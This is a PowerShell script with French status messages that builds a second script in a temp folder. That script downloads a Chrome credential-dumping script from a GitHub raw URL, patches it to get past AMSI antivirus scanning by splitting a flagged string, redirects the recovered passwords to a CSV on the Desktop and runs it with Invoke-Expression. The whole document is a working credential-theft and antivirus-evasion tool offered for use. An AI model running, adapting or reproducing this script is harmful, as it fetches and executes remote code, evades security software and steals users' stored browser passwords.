$PS_OUT = "$env:TEMP\chrome_creds_tmp\run_chrome.ps1"
New-Item -ItemType File -Force -Path $PS_OUT | Out-Null
Set-Content -Path $PS_OUT -Value '$ErrorActionPreference = "SilentlyContinue"'
Add-Content -Path $PS_OUT -Value 'Write-Host "[LANCEMENT] Recuperation dynamique depuis GitHub..." -f Yellow'
Add-Content -Path $PS_OUT -Value '$c = (Invoke-WebRequest "https://raw.githubusercontent.com/marcosimioni/chrome-creds/master/chrome-creds.ps1" -UseBasicParsing).Content'
Add-Content -Path $PS_OUT -Value 'Write-Host "[LANCEMENT] Patch de contournement AMSI Antivirus..." -f Yellow'
Add-Content -Path $PS_OUT -Value '$c = $c -replace ''(?s)"Export".*?"Import"'', ''"Export" { } "Import"'''
Add-Content -Path $PS_OUT -Value '$c = $c -replace ''\$arrExp \| Format-Table'', (''$arrExp | Export-Csv -Path "'' + $HOME + ''\Desktop\Chrome_Local_Passwords.csv" -NoTypeInformation; Write-Host "`n[SUCCES] Mots de passe exportes sur le Bureau sous Chrome_Local_Passwords.csv !" -ForegroundColor Green'')'
Add-Content -Path $PS_OUT -Value '$c = $c -replace ''System\.Security\.Cryptography'', ''System.Security.Crypto"+"graphy'''
Add-Content -Path $PS_OUT -Value 'Invoke-Expression $c'
